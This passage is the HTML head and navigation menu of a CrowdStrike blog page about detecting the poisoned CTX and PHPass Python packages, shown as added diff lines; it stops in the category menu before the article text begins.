@@ -1,0 +1,2371 @@
+
+<!DOCTYPE HTML>
+<html lang="en-US" hrefLang="en-US" data-href-lang="en-US" data-wcmmode-disabled="true">
+    <head>
+    <meta charset="UTF-8"/>
+    <title>Detecting Poisoned Python Packages: CTX and PHPass | CrowdStrike</title>
+    
+    <meta name="description" content="Learn how CrowdStrike can detect repository account takeover of CTX and PHPass python packages using Falcon Horizon cloud security posture management."/>
+    <meta name="template" content="crowdstrike-blog-detail-page"/>
+    <meta name="MobileOptimized" content="width"/>
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta http-equiv="x-ua-compatible" content="ie=edge"/>
+    
+    <meta property="twitter:card" content="summary"/>
+    <meta name="robots" content="index, follow"/>
+    
+    <meta name="content-page-ref" content="bAV1NaGYBbsXe2-ZwxFTQQXWwVsJAbqJikMWYeLmosPtwqmK-bCVVp5KJ5xCGWFuJ5XuVuQKqe82ULB8QpI6_Iy17SZ4_TlVgFtJX9zfbaj6swhDmgMNbwwX392QiJpY6NMHaQ7JVSCQ8Mk9jNEj97Ne_tEMAP9dBLIPXvz1cUG8sYt1IOqZCBh329ze_FNE"/>
+<script defer="defer" type="text/javascript" src="/.rum/@adobe/helix-rum-js@%5E2/dist/micro.js"></script>
+<link rel="canonical" href="https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/"/>
+    
+    
+        <link rel="alternate" href="https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/" hreflang="en-US"/>
+    
+        <link rel="alternate" href="https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/" hreflang="x-default"/>
+    
+
+    
+<meta name="og:image" content="https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-5.jpeg"/>
+<meta name="og:type" content="website"/>
+<meta name="twitter:title" content="Detecting Poisoned Python Packages: CTX and PHPass | CrowdStrike"/>
+<meta name="og:site_name" content="CrowdStrike.com"/>
+<meta name="twitter:description" content="Learn how CrowdStrike can detect repository account takeover of CTX and PHPass python packages using Falcon Horizon cloud security posture management."/>
+<meta name="og:title" content="Detecting Poisoned Python Packages: CTX and PHPass | CrowdStrike"/>
+<meta name="og:locale" content="en-US"/>
+<meta name="og:url" content="https://www.crowdstrike.com/en-us/blog/how-crowdstrike-detects-poisoned-python-packages-ctx-phpass/"/>
+<meta name="og:updated_time" content="2025-01-30T19:30:57"/>
+<meta name="og:description" content="Learn how CrowdStrike can detect repository account takeover of CTX and PHPass python packages using Falcon Horizon cloud security posture management."/>
+<meta name="og:image:secure_url" content="https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-5.jpeg"/>
+<meta name="twitter:image" content="https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2022/06/Blog_1060x698-5.jpeg"/>
+
+    
+
+
+
+
+<!-- OneTrust Cookies Consent Notice start for default -->
+
+    
+        
+            <script type="text/javascript" src="https://cdn.cookielaw.org/consent/bee15b7c-b632-450e-9003-9c8b60b3b978/OtAutoBlock.js" data-cfasync="false"></script>
+        
+    
+    <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="bee15b7c-b632-450e-9003-9c8b60b3b978" data-cfasync="false">
+        </script>
+        <script type="text/javascript" data-cfasync="false">
+            function OptanonWrapper() { }
+        </script>
+    
+
+<!-- OneTrust Cookies Consent Notice end for default -->
+
+
+
+
+    <script type="text/javascript" data-cfasync="false">
+    !function(e,a,n,t){var i=e.head;if(i){
+    if (a) return;
+    var o=e.createElement("style");
+    o.id="alloy-prehiding",o.innerText=n,i.appendChild(o),setTimeout(function(){o.parentNode&&o.parentNode.removeChild(o)},t)}}
+    (document, document.location.href.indexOf("adobe_authoring_enabled") !== -1, "[data-target-location='true'] { opacity: 0 !important}", 3000);
+</script>
+    <script type="text/javascript" src="//assets.adobedtm.com/d72cd986aea0/6c9104833b6e/launch-bacc530d480b.min.js" async data-cfasync="false"></script>
+
+
+<!-- Initialize Analytics JS -->
+
+    
+    
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-global-analytics.lc-83c4ea476b1898741f0129d359b65083-lc.min.js"></script>
+
+
+
+
+
+<!-- load base css -->
+
+    
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-grid.lc-d75b4ada966a12a0acc4f4483174f716-lc.min.css" type="text/css">
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-base.lc-d8e9a44764866640e709abbb8b7e48f7-lc.min.css" type="text/css">
+
+
+
+
+<!-- Initialize Language Direction -->
+
+    
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-language.lc-7085071ea35e3fe3f74984b851ee0b98-lc.min.js"></script>
+
+
+
+
+<!-- TODO - Determine how we can preload this -->
+
+    
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-fonts.lc-dd2b825829f827f763e05f50d4301d8f-lc.min.css" type="text/css">
+
+
+
+
+
+    
+    
+    
+
+    
+
+    
+    
+<script src="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-dependencies.lc-39968705ebaffa8af8c834134a4525b2-lc.min.js"></script>
+
+
+
+    
+    
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-dependencies.lc-2929dd9d69a653da2cf8fe429017e6b6-lc.min.css" type="text/css">
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-common.lc-c023ec0e7360f7648eae2bfa8787f5ae-lc.min.css" type="text/css">
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-wp-fonts.lc-16310b1b180d7cdf3931f58a57180681-lc.min.css" type="text/css">
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-wp.lc-62218a349525beac4891e5b26813bf81-lc.min.css" type="text/css">
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-addsearch.lc-fb99bcc6ec382a5aa54f4b2eb92637cd-lc.min.css" type="text/css">
+<link rel="stylesheet" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-dotcomv2.lc-c0080e0c99fda6cc14cf9a6c852d662b-lc.min.css" type="text/css">
+
+
+
+    
+
+    
+    <link rel="icon" href="/etc.clientlibs/crowdstrike/clientlibs/crowdstrike-common/resources/favicon.ico"/>
+
+<!-- SEO SCHEMA -->
+
+
+    <!-- Custom SEO Scripts -->
+
+    
+    
+</head>
+    <body class="page_blogs page basicpage" data-disable-alertbar="false" data-alertbar-xf="/content/experience-fragments/crowdstrike-www/locale-sites/us/en-us/site/header/header-elements/alert/master" data-start-gradient="#EC0000" data-end-gradient="#1F60A2" data-enable-secondary-nav="false" data-product-promo-enabled="true" data-promo-xf="/content/experience-fragments/crowdstrike-www/locale-sites/us/en-us/site/cybersecurity-101/cta/global-threat-report/master">
+        
+    
+        <!-- <script async="async" type="text/javascript" src="https://addsearch.com/js/?key=7737a29b854de71521b1cd72c4118cfc"></script> -->
+        <div class="cmp-addsearch">
+            <input type="hidden" name="as_key" value="7737a29b854de71521b1cd72c4118cfc"/>
+            <input type="hidden" name="as_domain" value="addsearch.com"/>
+        </div>
+    
+
+        
+        
+            
+    <div style="display: none;">
+        
+    </div>
+
+            
+            
+
+
+
+            
+<div class="root responsivegrid">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
+<div id="experiencefragment-96c5406858" class="cmp-experiencefragment cmp-experiencefragment--header" data-target-location="false">
+
+    
+    
+    <div id="container-d3ee6ff6f5" class="cmp-container" data-cmp-is="responsive-grid-container">
+        
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">
+
+
+<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
+    
+    <div class="header aem-GridColumn aem-GridColumn--default--12"><div class="cmp-wp-header blog_main_navigation">
+    <div data-selector="promoInsert" data-id="mainPromoBar"></div>
+    <div data-selector="promoInsert" data-id="secondaryPromoBar"></div>
+    <div id="blogNavInsertLocation">
+        <div class="cmp-wp-sociallinks-header">
+            
+    
+    
+        
+
+<div class="blog_main_navigation_top" id="sociallinks-en-us">
+    <div class="container">
+        <div class="row">
+            <div class="col-12">
+                <ul class="d-flex justify-content-end align-items-center">
+                    <li id="searchBlog" class="mx-2">
+                        <div data-cmp-is="add-search" id="search-header">
+                            <!-- Open Modal Button -->
+                            <button class="search_btn fa-solid fa-magnifying-glass" aria-label="Click to open Search menu">
+
+                            </button>
+                            <!-- Modal Popup --> 
+                            <div class="modal-addsearch">
+                            <span class="modal-addsearch__close"></span>
+                            <div class="modal-addsearch__content">
+                                <div class="widget widget--addsearch">
+                                    <div class="widget__searchfield" id="searchfield"></div>
+                                    <div class="modal-addsearch__scroll-box">
+                                        <div class="widget__results" id="results"></div>
+                                        <div class="widget__load-more" id="loadMore"></div>
+                                    </div>
+                                </div>
+                            </div>
+                            </div>
+                        </div>
+                    </li>
+                                                
+                    <li class="mx-2">
+                        <a href="https://www.twitter.com/CrowdStrike" target="_blank" aria-label="twitter">
+                            <span class="fa-brands fa-x-twitter"></span>
+                        </a>
+                    </li>
+                    <li class="mx-2">
+                        
+                    </li>
+
+                    <li class="mx-2">
+                        <a href="https://www.linkedin.com/company/crowdstrike" target="_blank" aria-label="linkedin">
+                            <span class="fa-brands fa-linkedin"></span>
+                        </a>
+                    </li>
+
+                    <li class="mx-2">
+                        <a href="https://www.youtube.com/user/CrowdStrike" target="_blank" aria-label="youtube">
+                            <span class="fa-brands fa-youtube"></span>
+                        </a>
+                    </li>
+
+                    <li class="ml-2">
+                        <a href="mailto:info@crowdstrike.com" target="_blank" aria-label="envelope">
+                            <span class="fa fa-envelope"></span>
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+    <div style="display: none;">
+        
+    </div>
+
+    
+    
+	
+
+    
+
+        </div>
+        <div class="blog_main_navigation_bottom">
+            
+
+<div class="container" id="navigation-en-us">
+    <div class="row">
+        <div class="col-12 d-flex align-items-center">
+            <div class="blog_main_navigation_bottom_site_logo d-flex align-items-center">
+                
+
+<a class="cmp-wp-logo crowdstrike_logo" href="https://www.crowdstrike.com/en-us" data-target-location="false">
+    <img src="https://assets.crowdstrike.com/is/content/crowdstrikeinc/RedLogoCS" alt="Crowdstrike"/>
+    
+</a>
+<a class="blog_logo" href="/en-us/blog/" title="Blog">Blog</a>
+
+
+    <div style="display: none;">
+        
+    </div>
+
+
+    
+
+            </div>
+            <ul class="blog_navigation_right" data-target-location="false">
+                <li class="blog_navigation_right_li_tab">
+                    <a href="/en-us/blog/featured-articles/" class="blog_navigation_right_li_header">Featured</a>
+
+                    <ul class="horizontal_dropdown">
+                        <li>
+                            <a href="/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX</div>
+                                    <div class="date">Aug 07, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+                        <li>
+                            <a href="/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel%20(1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery</div>
+                                    <div class="date">Aug 06, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+                        <li>
+                            <a href="/en-us/blog/secure-agent-harness-execution-preventing-escape/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/secure-agent-harness-execution-preventing-escape.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TrainingGenAI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Secure Agent Harness Execution: Preventing Escape" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Secure Agent Harness Execution: Preventing Escape</div>
+                                    <div class="date">Aug 04, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+                        <li>
+                            <a href="/en-us/blog/crowdstrike-2026-threat-hunting-report/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-2026-threat-hunting-report.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates</div>
+                                    <div class="date">Aug 03, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    </ul>
+
+                </li>
+
+                <li class="blog_navigation_right_li_tab">
+                    <a href="/en-us/blog/recent-articles/" class="blog_navigation_right_li_header" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/recent-articles.html">Recent</a>
+
+                    <ul class="horizontal_dropdown">
+
+                        <li>
+                            <a href="/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-hunts-for-shell-command-obfuscation-vmware-esx.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-EMBER2024?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">CrowdStrike Threat Hunts for Shell Command Obfuscation on VMware ESX</div>
+                                    <div class="date">Aug 07, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+
+                        <li>
+                            <a href="/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/expanding-cybersecurity-ai-benchmarks-beyond-vulnerability-discovery.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel%20(1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Expanding AI Benchmarks in Cybersecurity Beyond Vulnerability Discovery</div>
+                                    <div class="date">Aug 06, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+
+                        <li>
+                            <a href="/en-us/blog/secure-agent-harness-execution-preventing-escape/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/secure-agent-harness-execution-preventing-escape.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-TrainingGenAI?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Secure Agent Harness Execution: Preventing Escape" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Secure Agent Harness Execution: Preventing Escape</div>
+                                    <div class="date">Aug 04, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+
+                        <li>
+                            <a href="/en-us/blog/crowdstrike-2026-threat-hunting-report/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/crowdstrike-2026-threat-hunting-report.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates</div>
+                                    <div class="date">Aug 03, 2026</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    </ul>
+
+                </li>
+
+                <li class="blog_navigation_right_li_tab">
+                    <a href="/en-us/blog/videos/" class="blog_navigation_right_li_header" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/videos.html">Video</a>
+
+                    <ul class="horizontal_dropdown">
+
+                        <li>
+                            <a href="/en-us/blog/video-highlights-the-4-key-steps-to-successful-incident-response/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/video-highlights-the-4-key-steps-to-successful-incident-response.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/IR-Video-Blog-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Video Highlights the 4 Key Steps to Successful Incident Response" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Video Highlights the 4 Key Steps to Successful Incident Response</div>
+                                    <div class="date">Dec 02, 2019</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+
+                        <li>
+                            <a href="/en-us/blog/helping-non-security-stakeholders-understand-attck-in-10-minutes-or-less/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/helping-non-security-stakeholders-understand-attck-in-10-minutes-or-less.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/video-ATTCK2-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Helping Non-Security Stakeholders Understand ATT&amp;CK in 10 Minutes or Less [VIDEO]" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Helping Non-Security Stakeholders Understand ATT&amp;CK in 10 Minutes or Less [VIDEO]</div>
+                                    <div class="date">Feb 21, 2019</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+
+                        <li>
+                            <a href="/en-us/blog/analyzing-targeted-intrusions-through-the-attck-framework-lens-video/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/analyzing-targeted-intrusions-through-the-attck-framework-lens-video.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/video-ATTCK2-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Analyzing Targeted Intrusions Through the ATT&amp;CK Framework Lens [VIDEO]" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Analyzing Targeted Intrusions Through the ATT&amp;CK Framework Lens [VIDEO]</div>
+                                    <div class="date">Jan 22, 2019</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    
+
+                        <li>
+                            <a href="/en-us/blog/qatars-commercial-bank-chooses-crowdstrike-falcon-a-partnership-based-on-trust/" data-link-tracked="true" data-uw-rm-brl="PR" data-uw-original-href="/content/crowdstrike-www/locale-sites/us/en-us/blog/qatars-commercial-bank-chooses-crowdstrike-falcon-a-partnership-based-on-trust.html">
+                                <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Edward-Gonam-Qatar-Blog2-1?wid=530&hei=349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Qatar’s Commercial Bank Chooses CrowdStrike Falcon®: A Partnership Based on Trust [VIDEO]" data-uw-rm-alt-original="" data-uw-rm-alt="CT"/></div>
+                                <div class="d-flex flex-column">
+                                    <div class="title">Qatar’s Commercial Bank Chooses CrowdStrike Falcon®: A Partnership Based on Trust [VIDEO]</div>
+                                    <div class="date">Aug 20, 2018</div>
+                                </div>
+                            </a>
+                        </li>
+
+                    </ul>
+
+                </li>
+
+                <li class="blog_navigation_right_li_tab">
+                    <a href="/en-us/blog/categories-overview/" class="blog_navigation_right_li_header" data-link-tracked="true" data-uw-rm-brl="PR">Category</a>
+
+                    <ul id="blog-navigation-category-dropdown" class="vertical_dropdown">
+                        <li class="vertical_dropdown_element ai-machine-learning active">
+                            <a href="/en-us/blog/category.ai-machine-learning/">
+                                <div class="title">Agentic SOC</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container ai-machine-learning">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/Agentic-SOC-Blog-icon.svg"/>
+                                    <dt class="d-flex align-items-center ai-machine-learning">Agentic SOC
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/how-ai-leading-security-teams-are-building-the-agentic-soc/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-SOC-AI?wid=1536&hei=1024&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="How AI-leading Security Teams Are Building the Agentic SOC"/>
+                                            </div>
+                                            <div class="title">How AI-leading Security Teams Are Building the Agentic SOC</div>
+                                        </a>
+                                        <div class="date">07/06/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/new-claude-integration-brings-audit-data-into-the-falcon-platform/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Integration?wid=1544&hei=1018&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="New Claude Integration Brings Audit Data into the Falcon Platform"/>
+                                            </div>
+                                            <div class="title">New Claude Integration Brings Audit Data into the Falcon Platform</div>
+                                        </a>
+                                        <div class="date">05/21/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/how-charlotte-ai-agentworks-fuels-securitys-agentic-ecosystem/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-AgentWorks?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="How Charlotte AI AgentWorks Fuels Security&#39;s Agentic Ecosystem "/>
+                                            </div>
+                                            <div class="title">How Charlotte AI AgentWorks Fuels Security&#39;s Agentic Ecosystem </div>
+                                        </a>
+                                        <div class="date">03/25/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-services-and-agentic-mdr-put-the-agentic-soc-in-reach/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Personalized-Threat-Intel%20(1)?wid=2048&hei=1350&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Services and Agentic MDR Put the Agentic SOC in Reach"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Services and Agentic MDR Put the Agentic SOC in Reach</div>
+                                        </a>
+                                        <div class="date">03/24/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element cloud-security ">
+                            <a href="/en-us/blog/category.cloud-security/">
+                                <div class="title">Cloud &amp; Application Security</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container cloud-security">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Cloud-Application-Security.svg"/>
+                                    <dt class="d-flex align-items-center cloud-security">Cloud &amp; Application Security
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/new-in-falcon-cloud-security-helping-security-teams-move-faster/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FCS-July26?wid=2048&hei=1365&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Cloud Security July 2026 Release: Helping Security Teams Move Faster in the Cloud"/>
+                                            </div>
+                                            <div class="title">Falcon Cloud Security July 2026 Release: Helping Security Teams Move Faster in the Cloud</div>
+                                        </a>
+                                        <div class="date">07/29/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/new-in-falcon-cloud-security-expanding-multi-cloud-coverage/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Cloud-Puzzle-Tech?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="Falcon Cloud Security June 2026 Release: Updates for Azure and Google Cloud"/>
+                                            </div>
+                                            <div class="title">Falcon Cloud Security June 2026 Release: Updates for Azure and Google Cloud</div>
+                                        </a>
+                                        <div class="date">06/29/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-state-of-cdr-survey-key-takeaways/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-CDRSurvey?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey"/>
+                                            </div>
+                                            <div class="title">94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey</div>
+                                        </a>
+                                        <div class="date">06/22/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-leads-2026-frost-radar-cloud-runtime-security/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-Frost-CARS-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike Named an Innovation and Growth Leader in the 2026 Frost Radar™: Cloud and Application Runtime Security"/>
+                                            </div>
+                                            <div class="title">CrowdStrike Named an Innovation and Growth Leader in the 2026 Frost Radar™: Cloud and Application Runtime Security</div>
+                                        </a>
+                                        <div class="date">06/11/26 </div>
+                                    </dd>
+                                
+                            </dl>
+                        </li>
+                    
+                        <li class="vertical_dropdown_element counter-adversary-operations ">
+                            <a href="/en-us/blog/category.counter-adversary-operations/">
+                                <div class="title">Threat Hunting &amp; Intel</div>
+                            </a>
+                            <dl class="vertical_dropdown_list">
+                                <div class="category-icon-container counter-adversary-operations">
+                                    <img class="category-icon" src="/content/dam/crowdstrike/marketing/en-us/icons/blog/Counter-Adversary-Ops.svg"/>
+                                    <dt class="d-flex align-items-center counter-adversary-operations">Threat Hunting &amp; Intel
+                                    </dt>
+                                </div>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/crowdstrike-2026-threat-hunting-report/">
+                                            <div class="image"><img src="https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0" alt="CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates"/>
+                                            </div>
+                                            <div class="title">CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates</div>
+                                        </a>
+                                        <div class="date">08/03/26 </div>
+                                    </dd>
+                                
+                                    <dd>
+                                        <a href="/en-us/blog/inside-astaroths-new-spambot-component/">
